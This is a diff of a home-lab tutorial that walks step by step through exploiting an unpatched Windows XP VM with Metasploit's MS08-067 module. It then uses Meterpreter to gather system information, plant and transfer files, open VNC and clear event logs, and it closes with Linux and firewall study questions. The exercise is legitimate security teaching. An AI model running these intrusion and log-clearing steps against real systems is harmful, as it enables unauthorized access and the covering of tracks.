@@ -1,187 +1,223 @@
 **********************************************
 Straightforward Training™
-Using Metasploit/Meterpreter to Windows XP (Short)
+Using Metasploit/Meterpreter into Windows XP (Advance)
 Author: Saulo S. Ortiz
 Date: 20190908
-Update: 20190909
+Update: 20190921
 **********************************************
 
 DISCLAIMER
-1. These steps are for educational purposes only and for use at your own network laboratory. If you use these steps without
-consent from the network owner, you’re on your own.
+1.	These steps are for educational purposes only and for use at your own network laboratory. If you use these steps without consent from the network owner, you’re on your own.
 
-2. I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide
-nor damages by following the steps…do so at your own risk. I have tested these steps myself and found no issues/damage to
-my own systems. Also I am not responsible for software links,software availability or versions.
+2.	I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide or damages by following the steps…do so at your own risk. I have tested these steps myself and found no issues/damage to my own systems. Also, I am not responsible for software links, software availability or versions differences.
 
-3. You will need to have common Linux knowledge to be able to follow this guide as well as what an .iso file is; installing
-and configuring a Linux distro in a VM environment, general VM knowledge, and basic DOS commands. I will not be covering
-these steps in this short guide. This guide is NOT for people that have no idea how to install, remove, update/upgrade, and
-configure Linux/Windows OS or VMs. Google is your best friend and research is part of the job.
+3.	You will need to have common Linux knowledge to be able to follow this guide as well as what an .iso file is; installing and configuring a Linux distro in a VM environment, general VM knowledge, and basic DOS commands. I will not be covering these steps in this short guide. This guide is NOT for people that have no idea how to install, remove, update/upgrade, and configure Linux/Windows O/S or VMs. Google is your best friend and research is part of the job.
 
 COMMONS COMMANDS TO KNOW:
-• ls		- Lists Files (LS)
-• pwd		- Prints the current path to screen
-• cd		- Call Directory
-• mkdir		- Make Directory
-• rm		- Deletes a folder and files in it (also rm –rf, or rmdir)
-• cat		- Prints the contents of a file to screen
-• ifconfig      - Displays local network information
-• echo		- Repeats a command to screen and assist in creating a file (Windows)
-• ren		- Rename a file or folder (Windows)
+•	ls		- Lists Files (LS)
+•	pwd		- Prints the current path to screen
+•	cd		- Call Directory
+•	mkdir		- Make Directory
+•	rm		- Deletes a folder and files in it (also rm –rf, or rmdir)
+•	cat		- Prints the contents of a file to screen
+•	ifconfig		- Displays local network information
+•	echo		- Repeats a command to screen and assist in creating a file (Windows)
+•	ren		- Rename a file or folder (Windows)
 
 LEGEND:
-• Commands: 	Words in BOLD are commands
-• Comments: 	Words in italic red are comments…many have additional commands
-• Important: 	Words with asterisk lines are important notes
-                ****************************************************
+•	Commands: 	Words in BOLD are commands
+•	Comments: 	Words in italic red are comments…many have additional commands
+•	Important: 	Words with asterisk lines are important notes
+****************************************************
 
 DEFAULT LOGINS:
-• Kali: root/toor
+•	Kali: root/toor
 
 WHAT YOU’LL NEED FOR THIS EXERCISE:
-• A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
-• ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
-• ISO file of the latest Kali release
-• OracleVirtualbox (free) or VMWare Workstation 12 or higher
+•	A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
+•	ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
+•	ISO file of the latest Kali release
+•	OracleVirtualbox (free) or VMWare Workstation 12 or higher
 
 ******************************************************************************
-NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the
-sides or the bottom of the screen.
+NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the sides or the bottom of the screen.
 ******************************************************************************
 
 SETUP:
-1. Install the VM application you want, then install Kali and Windows XP as VMs. Give Kali 4GB RAM and 40GB HDD space. Give
-Windows 1GB RAM. And also 40GB of HDD space.
-2. Give Kali 1 processor and 2 Cores of CPU. Give XP 1 processor with 1 Core CPU.
-3. Maximize the GPU memory on both Kali (1GB) and XP (512MB). Do not use 3D on any of them.
-4. Make sure both network connectivity are in NAT so they use the same network range. There is no need to be connected to
-the Internet for this to work.
+1.	Install the VM application you want, then install Kali and Windows XP as VMs.
+2.	Give the VMs:
+a.	Windows = 1 CPU/1 Core, 1GB RAM, and 8GB of HDD space.
+b.	Kali = 1 CPU/2 Cores, 4GB RAM and 40GB HDD space.
+3.	Maximize the GPU memory on both Kali (1GB) and XP (512MB).
+a.	Do not use 3D on any of them.
+4.	Make sure both VMs networks are in NAT so they use the same network range. There is no need to be connected to the Internet for this to work.
 
 ATTACK:
 Run both Kali and XP VMs.
 
-1. Find Kali’s IP address...
-  a. Type: ifconfig
+1.	Find your IP address…
+a.	Type: ifconfig
 
-2. In Kali scan for live-hosts...
-  a. Type: nmap –Pn <target>/24
-    i. Annotate your findings like IPs and their services running if any
+2.	In Kali scan for live-hosts…
+a.	Type: nmap –sn <target>/24
+i.	Annotate your findings like IPs and their services running if any
 
-3. Run metasploit...
-  a. Type: msfconsole
-  b. Type: use exploit/windows/smb/ms08_067_netapi
-    i. Have you used TAB to autocomplete a command?
-  c. Type: set RHOST
-    i. To the XP IP address
-  d. Type: run
-    i. Or exploit
+3.	Select your target and scan for open ports in stealth mode…
+a.	Type: nmap –sS –Pn <target>
+i.	Notice the SMB port service is running…we’ll use it on our attack
+
+4.	Open a new terminal and run metasploit…
+a.	Type: msfconsole
+b.	Type: use exploit/windows/smb/ms08_067_netapi
+i.	Have you used the TAB key to autocomplete a command?
+c.	Type: set
+i.	Look at your options…also use the show options if you cannot find the RHOST
+d.	Type: set RHOST
+i.	To the XP IP address
+e.	Type: run
+i.	Or exploit to start
 
 ******************************************************************************
 NOTE: You’re in meterpreter, a command shell connecting you to your target.
 ******************************************************************************
 
-1. In meterpreter...
-  a. Type: pwd
+1.	In meterpreter…
+a.	Type: pwd
 
-2. Find information about the target...
-  a. Type: sysinfo
-    i. Take notes
+2.	Find information about the target…
+a.	Type: sysinfo
+i.	Take notes
 
-3. Find network information...
-  a. Type: ipconfig
+3.	Find network information…
+a.	Type: ipconfig
 
-4. Move back to the root directory...
-  a. Type: cd \\
-    i. You can also use cd ..
+4.	Move back to the root directory…
+a.	Type: cd \\
+i.	You can also use cd ..
 
-5. Verify...
-  a. Type: ls
-    i. Or dir (it also works)
+5.	Verify where you are at…
+a.	Type: ls
+i.	Or type dir ...it also works
 
-6. Create a folder...
-  a. Type: mkdir whoops
+6.	Create a folder in the target…
+a.	Type: mkdir whoops
 
-7. Rename the folder...
-  a. Type: ren whoops gothacked
+7.	Rename the folder…
+a.	Type: ren whoops gothacked
 
-8. Verify...
-  a. Type: dir
+8.	Verify it’s there…
+a.	Type: dir
 
-9. Go into the folder...
-  a. Type: cd gothacked
+9.	Go into that folder…
+a.	Type: cd gothacked
 
-10. Create a file with text in it...
-  a. Type: execute –f cmd.exe –i –H
-    i. Or shell
-  b. Type:  echo “ this computer was hacked by me! “ > hacked.txt
-  c. Type: exit
+10.	Create a file with text in it…
+a.	Type: execute –f cmd.exe –i –H
+i.	Or type shell
+b.	Type:  echo “this computer was hacked by me!” > hacked.txt
+c.	Type: exit
 
-11. Back in meterpreter verify the file is there...
-  a. Type: ls
-  b. Type: cat hacked.txt
+11.	Back in meterpreter verify the file is there…
+a.	Type: ls
+b.	Type: cat hacked.txt
 
-12. Download the text file...
-  a. Type: download hacked.txt
+12.	Download the text file…
+a.	Type: download hacked.txt
 
-13. Background the session...
-  a. Type: background
-    i. Take note of the ID number for this session
+13.	Background the session…
+a.	Type: background
+i.	Take note of the ID number for this session
 
-14. Verify the file is in YOUR computer…
-  a. Type: ls
+14.	Verify the file is in YOUR computer…
+a.	Type: ls
 
-15. Open a new terminal and edit the file...
-  a. Type: nano hacked.txt
-  b. In a new line type: don’t forget to smile!
-  c. Comment out the first line using a # sign before the comment
-  d. Save it: Ctrl+S
-  e. Ctrl+X to exit
+15.	Open a new terminal and edit the file…
+a.	Type: nano hacked.txt
+b.	In a new line type: don’t forget to smile!
+c.	Comment out the first line using a # sign before the comment
+d.	Save it: Ctrl+S
+e.	Ctrl+X to exit
 
-16. Find the correct session ID for this attack...
-  a. Type: sessions
-  b. Type: sessions –i <#>
-    i. Replace the <#> with the correct number for the session
+16.	Find the correct session ID for this attack…
+a.	Type: sessions
+b.	Type: sessions –i <#>
+i.	Replace the <#> with the correct number for the session
 
 ******************************************************************************
 NOTE: You’re back in meterpreter!
 ******************************************************************************
 
-17. Upload the file back to the target...
-  a. Type: upload hacked.txt
+17.	Upload the file back to the target…
+a.	Type: upload hacked.txt
 
-18. Get a GUI of the target machine...
-  a. Type: run vnc
-    i. Wait a few seconds for this to work
+18.	Get a GUI of the target machine…
+a.	Type: run vnc
+i.	Wait a few seconds for this to work…if it doesn’t then there might be something blocking the connection. Try again or don’t. GUI gives you away as the user can see the mouse moving.
 
-19. Check the logs in Windows XP...
-  a. Navigate to Event Viewer inside Administrative Tools and check the logs
+19.	Go into Events in Windows and look at all the logs
 
-20. Using meterpreter clear the logs in XP...
-  a. Type: clearev
-
-21. Done...You can close all screens now.
+20.	STOP! Instead of clearing the logs now we will move on to make a new user to maintain persistence. But in case you were curious, the command to clear the logs is:
+a.	Type: clearev
+******************************************************************************
+NOTE: Move to the Maintain Persistence Guide
+******************************************************************************
 
 
 QUESTIONS
-In Linux, folders and files are considered the same thing…files. Answer the following questions:
+In Linux, folders and files are considered the same thing…files. Do some research and answer the following questions:
 
-1. What is a file or folder that begins with a period (.) in its name?
+1.	What does the command (dir) in Windows do? What is the equivalent in Linux?
 
-2. How can you look for them?
+2.	What is a file or folder that begins with a period (.) in its name?
 
-3. What is the command used to delete a folder that contains files/is not empty?
+3.	What is the command used to you look for those files with a period in their name? Use it.
 
-4. What is the command (dir) in Windows? What is the equivalent in Linux?
+4.	What is the command used to delete a folder that contains files/is not empty?
 
-5. What is VNC?
+5.	What is the command to create a “folder”?
 
-6. What is nano?
+6.	What is the command to rename a file?
 
-7. What is the command to update/upgrade Linux with the latest fixes/patches?
+7.	What is a VNC? What other program will you need for it to work?
 
-8. What is a BASH and how does a script begin?
+8.	What is nano and VIM? One of them is easier than the other.
 
-9. Can you write a small BASH script to update/upgrade?
+9.	Use a text editor to create a text file with some contents in it.
 
-10. What is the command to use to make a BASH script executable?
+10.	What is the command to read a file’s contents without opening it in a text editor?
+
+11.	What are the commands used to update and upgrade Linux with the latest fixes/patches?
+
+12.	Can you combine both of the update/upgrade commands to work as a single command? How?
+
+13.	What is the command to delete temporary files after an update/upgrade?
+
+14.	What does BASH stand for and with what declaration does the script start?
+
+15.	Write a small BASH script to update/upgrade you Linux machine.
+
+16.	What is the command to use to make a BASH script executable?
+
+17.	What is the command to tell a script to automatically continue without user input? Include it in your BASH script.
+
+18.	UFW stands for Uncomplicated Firewall. Do you have UFW installed?
+
+19.	What is the command to do a search for open source software available for Linux users?
+
+20.	Using the installation command, install UFW on your Linux machine.
+
+21.	What is the man-page?
+
+22.	Using the man-page (or the help description that every program comes with) find out if UFW is running or not? If not then enable it.
+
+23.	Using your ninja-like research abilities (Google), find out what ports are most common for hackers to attack and go disable them in UFW.
+
+24.	Using nmap, search for open ports on your system and check if you successfully blocked any of the ports you blocked in UFW. Do you have open ports even after you closed them? Why is this?
+
+25.	In a few words, describe the difference between the command nmap –Pn and nmap –sn.
+
+26.	One of these command just pings to see if there are live-hosts, the other searches for live-hosts and ports running. Which one does what?
+
+27.	Using the help flag or man-page, which nmap command will give you’re the O/S version and services running at the same time? What other commands give you similar information?
+
+28.	What is banner grabbing? What commands can you use to do this?
